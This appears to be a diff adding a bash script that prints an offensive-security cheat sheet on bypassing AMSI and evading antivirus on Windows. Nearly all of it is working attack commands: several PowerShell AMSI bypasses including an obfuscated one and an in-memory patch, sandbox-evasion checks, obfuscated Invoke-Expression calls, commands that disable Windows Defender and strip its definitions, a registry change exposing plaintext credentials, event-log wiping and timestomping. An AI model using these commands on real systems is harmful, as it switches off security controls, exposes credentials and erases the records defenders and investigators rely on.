@@ -1,0 +1,90 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── AMSI BYPASS & AV EVASION ─────────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── AMSI — amsiContext Corruption ────────────────────${NC}"
+echo -e "  ${GREEN}"'$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};'"${NC}"
+echo -e "  ${GREEN}"'$d=$c.GetFields("NonPublic,Static");Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};'"${NC}"
+echo -e "  ${GREEN}"'$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)'"${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── AMSI — amsiInitFailed Reflection ─────────────────${NC}"
+echo -e "  ${GREEN}"'$asm = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")'"${NC}"
+echo -e "  ${GREEN}"'$field = $asm.GetField("amsiInitFailed","NonPublic,Static")'"${NC}"
+echo -e "  ${GREEN}"'$field.SetValue($null,$true)'"${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── AMSI — Two-Stage (Beau's Method) ─────────────────${NC}"
+echo -e "  Note: Stage 1 (amsi.txt):"
+echo -e "  ${GREEN}"'$o=[Ref].Assembly.GetTypes();Foreach($x in $o) {if ($x.Name -like "*iUtils") {$l=$x}};$p=$l.GetFields("NonPublic,Static")'"${NC}"
+echo -e "  Note: Stage 2 (2.txt):"
+echo -e "  ${GREEN}"'$p=$l.GetFields("NonPublic,Static");Foreach($v in $p) {if ($v.Name -like "*Failed") {$z=$v}};$z.SetValue($null,$true)'"${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── AMSI — Obfuscated (0x4rt3mis) ────────────────────${NC}"
+echo -e "  ${GREEN}sET-ItEM ( 'V'+\"aR\" + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( \"{1}{0}\"-F'F','rE' ) ) ; (GeT-VariaBle ( \"1Q2U\" +\"zX\" ) -VaL ).\"A\`ss\`Embly\".\"GET\`TY\`Pe\"(( \"{6}{3}{1}{4}{2}{0}{5}\" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) ).\"g\`etf\`iElD\"( ( \"{0}{2}{1}\" -f'amsi','d','InitFaile' ),( \"{2}{4}{0}{1}{3}\" -f 'Stat','i','NonPubli','c','c,' ) ).\"sE\`T\`VaLUE\"( \${n\`ULl},\${t\`RuE} )${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── AMSI — AmsiOpenSession Patch (XOR RAX,RAX) ───────${NC}"
+echo -e "  Note: Requires LookupFunc from LookupFunc/getDelegateType runner"
+echo -e "  ${GREEN}"'[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession'"${NC}"
+echo -e "  ${GREEN}"'$buf = [Byte[]] (0x48, 0x31, 0xC0)'"${NC}              # XOR RAX, RAX"
+echo -e "  ${GREEN}"'[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)'"${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── AMSI — Jscript (wscript rename) ──────────────────${NC}"
+echo -e "  ${GREEN}"'var wsh = new ActiveXObject("WScript.Shell");'"${NC}"
+echo -e "  ${GREEN}"'wsh.Run("cmd /c copy C:\\Windows\\System32\\wscript.exe %TEMP%\\amsi.dll", 0, true);'"${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Sandbox Detection ────────────────────────────────${NC}"
+echo -e "  ${GREEN}VirtualAllocExNuma${NC}     # not emulated by most AV; returns null in sandbox -> exit"
+echo -e "  ${GREEN}FlsAlloc(0) == 0${NC}       # anti-emulation check"
+echo -e "  ${GREEN}Sleep(2000) timing${NC}     # sandbox accelerates sleep; check delta < 1500ms"
+echo -e "  ${GREEN}UserName check${NC}         # if (Environment.UserName == \"sandbox\") return;"
+echo -e "  ${GREEN}CPU count < 2${NC}          # sandboxes often single-core"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── PowerShell Obfuscation ────────────────────────────${NC}"
+echo -e "  ${GREEN}"'$c = '"'"'Invoke'"'"' + '"'"'-'"'"' + '"'"'Expression'"'"'; & ([scriptblock]::Create($c)) '"'"'whoami'"'"''"${NC}"
+echo -e "  ${GREEN}"'$cmd = [char]119+[char]104+[char]111+[char]97+[char]109+[char]105; Invoke-Expression $cmd'"${NC}"
+echo -e "  ${GREEN}"'$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('"'"'whoami'"'"')); powershell -EncodedCommand $enc'"${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Windows Defender Disable ─────────────────────────${NC}"
+echo -e "  ${GREEN}Set-MpPreference -DisableRealtimeMonitoring \$true${NC}"
+echo -e "  ${GREEN}Set-MpPreference -DisableIOAVProtection \$true${NC}"
+echo -e "  ${GREEN}Set-MpPreference -DisableScriptScanning \$true${NC}"
+echo -e "  ${GREEN}'C:\\Program Files\\Windows Defender\\MpCmdRun.exe' -RemoveDefinitions -All${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── WDigest Re-enable (Plaintext Creds) ──────────────${NC}"
+echo -e "  ${GREEN}reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Find-AVSignature (Binary Search) ─────────────────${NC}"
+echo -e "  ${GREEN}Find-AVSignature -StartByte 0 -EndByte (Get-Item payload.exe).Length -Interval 10000 -Path payload.exe -OutPath 'C:\\Tools\\test' -Verbose${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Event Log Clearing ───────────────────────────────${NC}"
+echo -e "  ${GREEN}Get-EventLog -List | ForEach-Object { Clear-EventLog \$_.Log }${NC}"
+echo -e "  ${GREEN}"'for /F "tokens=*" %1 in ('"'"'wevtutil.exe el'"'"') DO wevtutil.exe cl "%1"'"${NC}"
+echo -e "  ${GREEN}clearev${NC}                                  # Meterpreter"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Timestomping ─────────────────────────────────────${NC}"
+echo -e "  ${GREEN}\$file = Get-Item 'C:\\Temp\\malware.exe'${NC}"
+echo -e "  ${GREEN}\$legit = Get-Item 'C:\\Windows\\System32\\notepad.exe'${NC}"
+echo -e "  ${GREEN}\$file.CreationTime = \$legit.CreationTime; \$file.LastWriteTime = \$legit.LastWriteTime${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
